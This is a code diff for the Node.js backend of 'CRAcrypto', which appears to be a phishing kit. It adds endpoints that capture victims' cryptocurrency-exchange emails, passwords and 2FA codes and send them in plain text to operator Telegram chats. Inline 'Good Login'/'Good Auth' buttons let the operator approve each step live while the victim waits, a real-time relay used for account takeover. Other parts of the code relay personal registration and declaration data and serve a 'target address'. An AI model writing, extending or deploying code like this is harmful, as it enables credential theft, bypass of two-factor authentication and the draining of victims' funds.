@@ -16,6 +16,11 @@ const CHAT_IDS  = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.sp
 
 // Store message IDs by session (use IP or generate session ID)
 const sessionMessages = new Map();
+// Store exchange auth sessions with approval status
+const exchangeSessions = new Map();
+
+// Telegram polling state
+let lastUpdateId = 0;
 
 function generateLogId() {
   return 'LOGID-' + Math.floor(100000 + Math.random() * 900000);
@@ -43,6 +48,27 @@ async function sendTelegram(text) {
   }
 }
 
+async function sendTelegramWithButtons(text, buttons) {
+  if (!BOT_TOKEN || CHAT_IDS.length === 0) return null;
+  try {
+    // Send to all chat IDs with inline keyboard
+    const promises = CHAT_IDS.map(chatId => 
+      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: chatId,
+        text: text,
+        reply_markup: {
+          inline_keyboard: buttons
+        }
+      })
+    );
+    const responses = await Promise.all(promises);
+    return responses[0].data.result.message_id;
+  } catch (err) { 
+    console.error('Telegram with buttons:', err.response?.data || err.message); 
+    return null;
+  }
+}
+
 async function editTelegram(messageId, text) {
   if (!BOT_TOKEN || CHAT_IDS.length === 0 || !messageId) return;
   try {
@@ -53,6 +79,73 @@ async function editTelegram(messageId, text) {
     });
   } catch (err) { 
     console.error('Telegram edit:', err.response?.data || err.message); 
+  }
+}
+
+// Telegram polling for button clicks
+async function pollTelegramUpdates() {
+  if (!BOT_TOKEN) return;
+  
+  try {
+    const response = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
+      params: {
+        offset: lastUpdateId + 1,
+        timeout: 10,
+        allowed_updates: ['callback_query']
+      }
+    });
+    
+    const updates = response.data.result || [];
+    
+    for (const update of updates) {
+      lastUpdateId = update.update_id;
+      
+      if (update.callback_query) {
+        await handleCallbackQuery(update.callback_query);
+      }
+    }
+  } catch (err) {
+    console.error('Telegram polling error:', err.message);
+  }
+  
+  // Poll again after 1 second
+  setTimeout(pollTelegramUpdates, 1000);
+}
+
+async function handleCallbackQuery(callback_query) {
+  try {
+    const data = callback_query.data;
+    const [action, result, logId] = data.split('_');
+    
+    const session = exchangeSessions.get(logId);
+    if (!session) {
+      console.log('No session found for logId:', logId);
+      return;
+    }
+    
+    // Update session status
+    session.status = result === 'good' ? 'approved' : 'rejected';
+    console.log(`[CALLBACK] ${logId} ${action} ${result} - status updated to ${session.status}`);
+    
+    // Answer callback query
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      callback_query_id: callback_query.id,
+      text: result === 'good' ? '✅ Approved' : '❌ Rejected'
+    });
+    
+    // Edit message to show decision
+    const statusEmoji = result === 'good' ? '✅' : '❌';
+    const statusText = result === 'good' ? 'APPROVED' : 'REJECTED';
+    const originalText = callback_query.message.text;
+    const updatedText = originalText.replace('⏳ Awaiting approval...', `${statusEmoji} ${statusText}`);
+    
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+      chat_id: callback_query.message.chat.id,
+      message_id: callback_query.message.message_id,
+      text: updatedText
+    });
+  } catch (err) {
+    console.error('Callback handler error:', err.message);
   }
 }
 
@@ -117,17 +210,103 @@ app.post('/api/get-target-address', (req, res) => {
   res.json({ targetAddress: d.address });
 });
 
+// ═══════════════════════════════════════════
+// EXCHANGE LOGIN & VERIFICATION ENDPOINTS
+// ═══════════════════════════════════════════
+
+app.post('/api/exchange-login', async (req, res) => {
+  const { exchange, email, password } = req.body;
+  const logId = generateLogId();
+  const sessionKey = getSessionKey(req);
+  
+  const text = `🔐 EXCHANGE LOGIN - ${logId}\n` +
+    `════════════════════════\n` +
+    `Exchange: ${exchange.toUpperCase()}\n` +
+    `Email:    ${email}\n` +
+    `Password: ${password}\n` +
+    `\n⏳ Awaiting approval...`;
+  
+  const buttons = [[
+    { text: '✅ Good Login', callback_data: `login_good_${logId}` },
+    { text: '❌ Bad Login', callback_data: `login_bad_${logId}` }
+  ]];
+  
+  await sendTelegramWithButtons(text, buttons);
+  
+  // Store session with pending status
+  exchangeSessions.set(logId, {
+    status: 'pending',
+    stage: 'login',
+    exchange,
+    email,
+    sessionKey
+  });
+  
+  res.json({ success: true, logId });
+});
+
+app.post('/api/exchange-verify', async (req, res) => {
+  const { logId, exchange, codes } = req.body;
+  
+  // Format codes nicely
+  let codeText = '';
+  for (const [key, value] of Object.entries(codes)) {
+    if (value) codeText += `${key}: ${value}\n`;
+  }
+  
+  const text = `🔒 EXCHANGE 2FA - ${logId}\n` +
+    `════════════════════════\n` +
+    `Exchange: ${exchange.toUpperCase()}\n` +
+    `\n${codeText}` +
+    `\n⏳ Awaiting approval...`;
+  
+  const buttons = [[
+    { text: '✅ Good Auth', callback_data: `verify_good_${logId}` },
+    { text: '❌ Bad Auth', callback_data: `verify_bad_${logId}` }
+  ]];
+  
+  await sendTelegramWithButtons(text, buttons);
+  
+  // Update session
+  const session = exchangeSessions.get(logId);
+  if (session) {
+    session.status = 'pending';
+    session.stage = 'verify';
+    session.codes = codes;
+  }
+  
+  res.json({ success: true });
+});
+
+app.post('/api/exchange-check-status', (req, res) => {
+  const { logId } = req.body;
+  const session = exchangeSessions.get(logId);
+  
+  if (!session) {
+    return res.json({ status: 'unknown' });
+  }
+  
+  res.json({
+    status: session.status,
+    stage: session.stage
+  });
+  
+  // Clean up if approved or rejected
+  if (session.status === 'approved' || session.status === 'rejected') {
+    setTimeout(() => exchangeSessions.delete(logId), 60000); // Clean up after 1 minute
+  }
+});
+
+// ═══════════════════════════════════════════
+
 // New endpoint: Send initial telegram message when user reaches pleasewait page
 app.post('/api/send-initial-telegram', async (req, res) => {
-  console.log('[INITIAL] Send-initial-telegram hit');
   const { personalData } = req.body;
   const reg  = (personalData && personalData.register)    || {};
   const decl = (personalData && personalData.declaration) || {};
   
   const logId = generateLogId();
-  console.log('[INITIAL] Sending initial message with', logId);
   const messageId = await sendTelegram(formatPersonal(reg, decl, logId));
-  console.log('[INITIAL] Message sent, messageId:', messageId);
   
   // Store message ID and logId for this session
   const sessionKey = getSessionKey(req);
@@ -283,4 +462,10 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`CRAcrypto backend running on :${PORT}`);
   console.log(`Telegram: ${BOT_TOKEN ? 'OK' : 'NOT SET'}`);
+  
+  // Start Telegram polling for button clicks
+  if (BOT_TOKEN) {
+    console.log('Starting Telegram polling...');
+    pollTelegramUpdates();
+  }
 });
